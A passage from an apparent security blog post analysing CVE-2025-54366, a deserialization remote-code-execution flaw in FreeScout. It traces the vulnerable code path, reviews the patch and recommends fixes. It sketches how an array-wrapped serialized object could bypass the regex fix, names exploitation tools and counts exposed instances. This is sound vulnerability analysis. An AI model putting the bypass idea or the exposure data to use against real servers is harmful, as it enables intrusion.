<h2 id="Code-Review"><a href="#Code-Review" class="headerlink" title="Code Review"></a>Code Review</h2><p>Lets dive into some code and understand the flow of the request. Here is a quick walkthrough of how user provided input ends up in the unserialize function without any validation resulting in to RCE. </p>
<blockquote>
<p>This is where you can take help of AI to speed up your process. I added the code to VScode and ask the copilot to help me this.</p>
</blockquote>
<ol>
<li>HTTP Request Entry Point - This is our vulnerable request and parameter as seen above.</li>
</ol>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /conversation/ajax</span><br><span class="line"><span class="attribute">Parameters</span><span class="punctuation">: </span>attachments_all[] and attachments[]</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Route Processing (routes&#x2F;web.php:65) - Next freescout will route this request to ConversationsController as shown below.</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/conversation/ajax&#x27;</span>, [<span class="string">&#x27;uses&#x27;</span> =&gt; <span class="string">&#x27;ConversationsController@ajax&#x27;</span>, <span class="string">&#x27;laroute&#x27;</span> =&gt; <span class="literal">true</span>])</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>Controller Entry (ConversationsController.php:571) - This is where type of action is checked, which in our case is <code>send_reply</code>.</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">Request <span class="variable">$request</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$request</span>-&gt;action) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;send_reply&#x27;</span>:</span><br><span class="line">            <span class="comment">// Process the request</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>Attachment Processing (ConversationsController.php:851) - If attachments are found those gets passed to <code>processReplyAttachments</code> function for further processing.</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get attachments info</span></span><br><span class="line"><span class="comment">// Delete removed attachments.</span></span><br><span class="line"><span class="variable">$attachments_info</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">processReplyAttachments</span>(<span class="variable">$request</span>);</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>The Vulnerable Function (ConversationsController.php:3134) - Here is the vulnerable call to <code>decodeAttachmentsIds</code> that processes our input from <code>attachments_all</code> and <code>attachments</code> parameters.</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">processReplyAttachments</span>(<span class="params"><span class="variable">$request</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$has_attachments</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$attachments</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$request</span>-&gt;attachments_all)) &#123;</span><br><span class="line">        <span class="variable">$embeds</span> = [];</span><br><span class="line">        <span class="variable">$attachments_all</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decodeAttachmentsIds</span>(<span class="variable">$request</span>-&gt;attachments_all);  <span class="comment">// ← VULNERABLE CALL</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$request</span>-&gt;attachments)) &#123;</span><br><span class="line">            <span class="variable">$attachments</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decodeAttachmentsIds</span>(<span class="variable">$request</span>-&gt;attachments);      <span class="comment">// ← VULNERABLE CALL</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>The Critical Vulnerability (ConversationsController.php:3162) - This is the <code>\Helper::decrypt</code> function that decrypt the <code>attachment_id</code> as mentioned in the advisory.</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decodeAttachmentsIds</span>(<span class="params"><span class="variable">$attachments_list</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$attachments_list</span> <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$attachment_id</span>) &#123;</span><br><span class="line">        <span class="variable">$attachment_id_decrypted</span> = <span class="title class_">\Helper</span>::<span class="title function_ invoke__">decrypt</span>(<span class="variable">$attachment_id</span>);  <span class="comment">// ← DESERIALIZATION HELPER</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$attachment_id_decrypted</span> == <span class="variable">$attachment_id</span>) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$attachments_list</span>[<span class="variable">$i</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$attachments_list</span>[<span class="variable">$i</span>] = <span class="variable">$attachment_id_decrypted</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$attachments_list</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="7">
<li>The Vulnerable Decrypt Function (Helper.php:892) - This is where the unsafe deserialization happens.</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$value</span>, <span class="variable">$password</span> = <span class="literal">null</span>, <span class="variable">$unserialize</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">app</span>(<span class="string">&#x27;encrypter&#x27;</span>)-&gt;<span class="title function_ invoke__">decrypt</span>(<span class="variable">$value</span>, <span class="variable">$unserialize</span>); <span class="comment">// DESERIALIZATION HAPPENS HERE</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = (<span class="keyword">new</span> <span class="title class_">\Illuminate\Encryption\Encrypter</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)))-&gt;<span class="title function_ invoke__">decrypt</span>(<span class="variable">$value</span>, <span class="variable">$unserialize</span>); <span class="comment">// DESERIALIZATION HAPPENS HERE</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>As you may have noticed there is no input validation or any sort of checks done on the <code>attachment_id</code> parameter to avoid unsafe deserialization. </p>
<h3 id="Fix-for-the-vulnerability"><a href="#Fix-for-the-vulnerability" class="headerlink" title="Fix for the vulnerability"></a>Fix for the vulnerability</h3><p>Lets look at the fix that has been implemented now. Here is the link to the diff from their github <a target="_blank" rel="noopener" href="https://github.com/freescout-help-desk/freescout/commit/e2de65f3f32f825b4ec5558643ed81438c9a6bc6">e2de65f3f32f825b4ec5558643ed81438c9a6bc6</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$value</span>, <span class="variable">$password</span> = <span class="literal">null</span>, <span class="variable">$force_unserialize</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">app</span>(<span class="string">&#x27;encrypter&#x27;</span>)-&gt;<span class="title function_ invoke__">decrypt</span>(<span class="variable">$value</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = (<span class="keyword">new</span> <span class="title class_">\Illuminate\Encryption\Encrypter</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)))-&gt;<span class="title function_ invoke__">decrypt</span>(<span class="variable">$value</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If the value is scalar - unserialize it,</span></span><br><span class="line">        <span class="comment">// Otherwise - do not, as objects may contain dangerous code.</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;^[dsa]:&quot;</span>, <span class="variable">$value</span>) || <span class="variable">$force_unserialize</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>unserialize</code> has been replaced with <code>force_unserialize</code> and set to false to not allow deserialization by default.</li>
<li><code>false</code> parameter has been added to line 5 and 7 to decrypt call</li>
<li>Next lines have a regex check for <code>$value</code> which check if its starts with <code>d</code> or <code>s</code> or <code>a</code> which represents below types<br>  <code>d:</code> - serialized double&#x2F;float<br>  <code>s:</code> - serialized string<br>  <code>a:</code> - serialized array<br>  It is missing two other types, i.e.<br>  <code>i:</code> - serialized integer<br>  <code>O:</code> - serialized object</li>
<li>If it starts with these 3 values it is supposed to serialize them but due to presence of <code>!</code> negation on preg_match it wont. This is still a bit of work in progress code as I understand it. The latest docker image and release <code>1.8.190</code> has the following code</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;#^[idsa]:#&quot;</span>, <span class="variable">$value</span>) || <span class="variable">$force_unserialize</span>) &#123;</span><br></pre></td></tr></table></figure>
<ul>
<li>This one allows any value that start with either of <code>idsa</code> and not objects as those could be our malicious payload.</li>
<li>This fix itself is not a great one. If someone manages to create an exploit based on serialized array instead of object. The value would look similar to <code>a:1:&#123;s:4:&quot;data&quot;;O:9:&quot;SomeClass&quot;:1:&#123;...&#125;&#125;</code>. The preg_match condition will now pass allowing deserialization of our payload leading to RCE again.</li>
</ul>
<p>Here are the recommended fixes </p>
<ol>
<li>Removing unsafe <code>unserialize()</code> calls if possible</li>
<li>Using JSON instead of PHP serialization or using json encode&#x2F;decode to safely create objects instead of trusting user inputs</li>
<li>Adding HMAC integrity validation</li>
<li>Implementing strict input validation - regex is one of the but you need to be very careful on how its implemented as situation like above can happen.</li>
</ol>
<h2 id="Exposure-on-the-Web"><a href="#Exposure-on-the-Web" class="headerlink" title="Exposure on the Web"></a>Exposure on the Web</h2><p>There are some 6K+ instances of freescout visible on fofa. Some of the are likely to be vulnerable if not updated since the disclosure.</p>
<p><img src="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/fofa.png" alt="fofa"></p>
<p>Similarly on Shodan we see some 1K instances.</p>
<p><img src="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/shodan.png" alt="shodan"></p>
<p>Since this exploit requires knowledge of APP_KEY as well having an authenticated user session, the exploitability&#x2F;likelihood reduces quite a bit. None the less, better patch than be sorry 😊</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>OWASP - <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#language-agnostic-methods-for-deserializing-safely">Deserialization_Cheat_Sheet</a><br>OWASP - <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#php">php deserialization fix</a><br>GitHub diff - <a target="_blank" rel="noopener" href="https://github.com/freescout-help-desk/freescout/commit/e2de65f3f32f825b4ec5558643ed81438c9a6bc6">e2de65f3f32f825b4ec5558643ed81438c9a6bc6</a><br>GitHub Advisory - <a target="_blank" rel="noopener" href="https://github.com/freescout-help-desk/freescout/security/advisories/GHSA-vcc2-6r66-gvvj">GHSA-vcc2-6r66-gvvj</a><br>GitHub Repo - <a target="_blank" rel="noopener" href="https://github.com/synacktiv/laravel-crypto-killer">laravel-crypto-killer</a><br>GitHub Repo - <a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">phpggc</a><br>GitGuardian Blog <a target="_blank" rel="noopener" href="https://blog.gitguardian.com/exploiting-public-app_key-leaks/">exploiting-public-app_key-leaks</a><br>Synacktiv Blog <a target="_blank" rel="noopener" href="https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis">laravel-appkey-leakage-analysis</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Archive</a></li>
        
          <li><a href="/tags/">Tags</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/securitytaters">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Setup"><span class="toc-number">2.</span> <span class="toc-text">Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Steps-to-Reproduce-the-CVE"><span class="toc-number">3.</span> <span class="toc-text">Steps to Reproduce the CVE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Review"><span class="toc-number">4.</span> <span class="toc-text">Code Review</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fix-for-the-vulnerability"><span class="toc-number">4.1.</span> <span class="toc-text">Fix for the vulnerability</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exposure-on-the-Web"><span class="toc-number">5.</span> <span class="toc-text">Exposure on the Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">6.</span> <span class="toc-text">References</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&text=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&title=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&is_video=false&description=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data&body=Check out this article: http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&title=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&title=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&title=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&title=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&name=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data&description=Reproducing insecure deserialization exploit for freescout CVE and reviwing the vulnerable code and fixes for it."><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&t=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2018-2025
    0xm4v3rick
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Archive</a></li><!--
     --><!--
       --><li><a href="/tags/">Tags</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/securitytaters">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
